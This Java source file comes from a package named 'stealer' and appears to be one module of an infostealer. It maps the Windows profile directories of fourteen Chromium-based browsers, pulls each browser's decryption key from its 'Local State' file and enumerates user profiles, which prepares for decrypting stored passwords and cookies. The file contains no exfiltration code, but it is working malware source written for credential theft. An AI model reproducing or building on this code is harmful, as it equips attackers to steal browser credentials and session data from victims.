package com.github.shurpe.stealer.utils.browser;

import org.jetbrains.annotations.Nullable;

import java.io.File;
import java.nio.file.Paths;

import static com.github.shurpe.stealer.utils.Utils.APPDATA;
import static com.github.shurpe.stealer.utils.Utils.LOCAL_APPDATA;

public final class Browser {

	private final Info info;
	private final byte @Nullable [] decryptionKey;
	private final BrowserProfile[] profiles;

	public Browser(final Info info) {
		this.info = info;

		/*if (!info.dataDirectory.isDirectory()) {
			return;
		}*/

		decryptionKey = getNewDecryptionKey();
		profiles = getNewProfiles();
	}

	public Info getInfo() {
		return info;
	}

	public byte @Nullable [] getDecryptionKey() {
		return decryptionKey;
	}

	@Nullable
	public BrowserProfile[] getProfiles() {
		return profiles;
	}

	private byte @Nullable [] getNewDecryptionKey() {
		final File lsFile = new File(info.dataDirectory, "Local State");

		if (lsFile.isFile()) {
			return ChromiumDecryptor.getDecryptionKey(lsFile);
		}

		return null;
	}

	@Nullable
	private BrowserProfile[] getNewProfiles() {
		final File[] profileDirs = getProfileDirectories();

		if (profileDirs == null) {
			return null;
		}

		final BrowserProfile[] profiles = new BrowserProfile[profileDirs.length];

		for (int i = 0; i < profileDirs.length; i++) {
			profiles[i] = new BrowserProfile(this, profileDirs[i]);
		}

		return profiles;
	}

	@Nullable
	private File[] getProfileDirectories() {
		return info.dataDirectory.listFiles(f -> f.getName().equals("Default")
						|| f.getName().contains("Profile"));
	}

	public enum Info {
		OPERA                (APPDATA + "\\Opera Software\\Opera Stable",                  "Opera"),
		OPERA_GX             (APPDATA + "\\Opera Software\\Opera GX Stable",               "Opera GX"),
		GOOGLE_CHROME        (LOCAL_APPDATA + "\\Google\\Chrome\\User Data",               "Google Chrome"),
		MICROSOFT_EDGE       (LOCAL_APPDATA + "\\Microsoft\\Edge\\User Data",              "Microsoft Edge"),
		BRAVE                (LOCAL_APPDATA + "\\BraveSoftware\\Brave-Browser\\User Data", "Brave"),
		VIVALDI              (LOCAL_APPDATA + "\\Vivaldi\\User Data",                      "Vivaldi"),
		YANDEX               (LOCAL_APPDATA + "\\Yandex\\YandexBrowser\\User Data",        "Yandex"),
		AMIGO                (LOCAL_APPDATA + "\\Amigo\\User Data",                        "Amigo"),
		CHROMIUM             (LOCAL_APPDATA + "\\Chromium\\User Data",                     "Chromium"),
		BLISK                (LOCAL_APPDATA + "\\Blisk\\User Data",                        "Blisk"),
		IRIDIUM              (LOCAL_APPDATA + "\\Iridium\\User Data",                      "Iridium"),
		CENT_BROWSER         (LOCAL_APPDATA + "\\CentBrowser\\User Data",                  "Cent Browser"),
		EPIC_PRIVACY_BROWSER (LOCAL_APPDATA + "\\Epic Privacy Browser\\User Data",         "Epic Privacy Browser"),
		THORIUM              (LOCAL_APPDATA + "\\Thorium\\User Data",                      "Thorium");

		private final String dataPath;
		private final String browserName;
		private final File dataDirectory;

		Info(final String dataPath, final String browserName) {
			this.dataPath = dataPath;
			this.browserName = browserName;

			dataDirectory = Paths.get(dataPath).toFile();
		}

		public String getDataPath() {
			return dataPath;
		}

		public String getBrowserName() {
			return browserName;
		}

		public File getDataDirectory() {
			return dataDirectory;
		}
	}
}